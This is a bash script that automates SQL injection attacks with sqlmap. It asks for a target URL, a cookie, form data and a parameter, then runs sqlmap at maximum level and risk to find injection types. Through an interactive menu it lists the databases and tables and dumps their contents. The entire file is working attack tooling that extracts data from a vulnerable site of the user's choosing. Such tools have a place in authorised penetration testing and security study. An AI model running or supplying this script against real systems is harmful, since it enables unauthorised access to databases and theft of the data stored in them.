#!/usr/bin/env bash

set -e

RESET="\033[0m"
BOLD="\033[1m"
RED="\033[31m"
GREEN="\033[32m"
FILENAME=${0##*/}
PAYLOAD=(Hide Display)

declare -a DBS
declare -A TBS
declare -A DATAS

INPUT() {
	local INPUT
	echo -e "$*$RESET" 1>&2
	read -p " > " INPUT
	echo 1>&2
	echo "$INPUT"
}

JOIN() {
	local join=$1
	printf "$2"
	for x in "${@:3}"; do
		printf "$join$x"
	done
	echo
}

LOG() {
	local br="\n"
	local LOG=
	case ${1,,} in
		ok|success)
			LOG="${GREEN}  OK  "
			shift
			;;
		error|fail|failed)
			LOG="${RED}FAILED"
			shift
			;;
		*)
			LOG="      "
			br=
			;;
	esac
	printf "\r[$BOLD$LOG$RESET] $LOGMSG$*$br"
}

ERROR() {
	clear >&2
	HEADER >&2
	echo >&2
	echo -e "$FILENAME: ${RED}${BOLD}Error: $*${RESET}" >&2
	return 1 # exit 1
}

if [ -n "`which xterm`" ]; then TERMINAL="xterm -e"
elif [ -n "`which gnome-terminal`" ]; then TERMINAL="gnome-terminal --hide-menubar --wait -- bash -c"
else TERMINAL="eval"
fi
RUN() {
	local TEMPFILE=`mktemp -u`
	local COMMAND="sqlmap --level=5 --risk=3 --batch -u '$URL' --cookie='$COOKIE' -p '$TARGET' $@"
	test -n "$FORMDATA" && COMMAND+=" --data='$FORMDATA'"
	test "$TERMINAL" != "eval" && local _="| tee" || local _=">"
	$TERMINAL "$COMMAND 2>&1 $_ $TEMPFILE"
	cat $TEMPFILE 2> /dev/null
	rm $TEMPFILE
}

HEADER() {
	echo -en "$GREEN"
	echo "/*"
	echo " * Method   : $METHOD"
	echo " * URL      : $URL"
	echo " * Cookie   : $COOKIE"
	echo " * FormData : $FORMDATA"
	echo " * Target   : $TARGET"
	echo " * DBMS     : $DBMS_INFO"
	echo " * "
	echo " * SQLi Type:"
	if [ "$PAYLOAD" == "Hide" ]; then
		echo "$TYPES" | sed "s/^/ * /" | grep "Type:" | sed "s/Type: //"
	else
		echo "$TYPES" | sed "s/^/ * /"
	fi
	echo " */"
	echo -en "$RESET"
}

SELECT() {
	local TITLE="$1"
	local ZERO="$2"
	shift 2
	clear
	HEADER
	echo -en "\n$GREEN$BOLD"
	echo "$TITLE"
	test -n "$*" && JOIN "\n" "$@" | cat -b
	echo "     0	${ZERO}"
	echo "    -1	${PAYLOAD[1]} Payloads by SQLi Type"
	echo -en "$RESET\n"
	while :; do
		NUM=`INPUT "Select Number"`
		if [ -z "`expr $NUM \* 0 2> /dev/null`" ]; then
			continue
		elif [ $NUM -lt -1 -o ${#@} -lt $NUM ]; then
			continue
		elif [ $NUM == -1 ]; then
			PAYLOAD=(${PAYLOAD[1]} $PAYLOAD)
		fi
		break
	done
}

START() {
	METHOD=`INPUT "Enter Method (Default: GET)"`
	test "${METHOD^^}" == "POST" && METHOD="POST" || METHOD="GET"

	URL=
	while [ -z "$URL" ]; do
		URL=`INPUT "Enter URL (e.g. http://localhost/?key1=val1&key2=val2)"`
	done

	COOKIE=`INPUT "Enter Cookie (e.g. key1=val1; key2=val2)"`

	if [ "$METHOD" == "POST" ]; then
		FORMDATA=`INPUT "${GREEN}${BOLD}Enter FormData (e.g. key1=val1&key2=val2)${RESET}"`
	fi

	TARGET=`INPUT "Enter Target (e.g. key1, key2)"`

	LOGMSG="Finding SQLi Types & Databases..." && LOG
	RESULT=`RUN --dbs`
	if [[ "$RESULT" != *"---"*"Parameter:"*"Type: "*"Payload:"*"---"* ]]; then
		LOG "error"
		ERROR "Unable to attack"
	fi
	LOG "ok"

	DBMS_INFO=`echo "$RESULT" | grep "back-end DBMS:" | cut -d" " -f3-`
	DBMS=${DBMS_INFO%% *}

	TYPES=${RESULT%---*}
	TYPES=${TYPES##*---}
	TYPES=`echo "$TYPES" | grep Type -A 2 | grep -v "^\-\-" | sed "s/^    Type/  - Type/g"`

	RESULT=${RESULT##*available databases [}
	DB_CNT=${RESULT%%]:*}
	RESULT=`echo "$RESULT" | head -$((DB_CNT+1)) | tail -$DB_CNT | sed "s/\[\*\] //g"`
	DBS=($RESULT)

	test "${DBMS,,}" == "sqlite" && ERROR "SQLite does not Support."
	for DB in "${DBS[@]}"; do
		LOGMSG="Finding Tables in Database $DB..." && LOG
		RESULT=`RUN -D $DB --tables`
		if [ -z "`echo "$RESULT" | grep ^"Database: $DB"`" ]; then
			LOG "failed"
			continue
		fi
		RESULT=${RESULT##*Database: $DB$'\n'[}
		TB_CNT=${RESULT%% *}
		RESULT=`echo "$RESULT" | head -$((TB_CNT+2)) | tail -$TB_CNT | sed "s/^| //g" | sed "s/ *|$//g"`
		TBS["$DB"]=$RESULT
		LOG "success"
	done
}

clear
START
while :; do
	SELECT "List of Databases:" "Exit" "${DBS[@]}"
	if [ $NUM == 0 ]; then
		break
	elif [ $NUM == -1 ]; then
		continue
	fi
	DB="${DBS[@]:$NUM-1:1}"

	while :; do
		TMP=(${TBS["$DB"]})
		SELECT "List of Tables in Database $DB:" "Back" "${TMP[@]}"
		if [ $NUM == 0 ]; then
			break
		elif [ $NUM == -1 ]; then
			continue
		fi
		TB="${TMP[@]:$NUM-1:1}"

		KEY="$DB/$TB"
		if [ -z "${DATAS["$KEY"]}" ]; then
			echo "Dumping..."
			TMP=`RUN -D "$DB" -T "$TB" --dump`
			TMP_NUM=`echo "$TMP" | wc -l`
			LINE_NUM=`echo "$TMP" | grep -n "Table: $TB" | cut -d: -f1`
			DATA=`echo "$TMP" | tail -$((TMP_NUM - LINE_NUM - 1)) | sed "s/.*large table size/\|\n\| \[...Skip\]\n\|/g" | grep "^[+|]"`
			DATAS["$KEY"]=$DATA
		fi
		echo
		echo "${DATAS["$KEY"]}" | less -S
	done
done
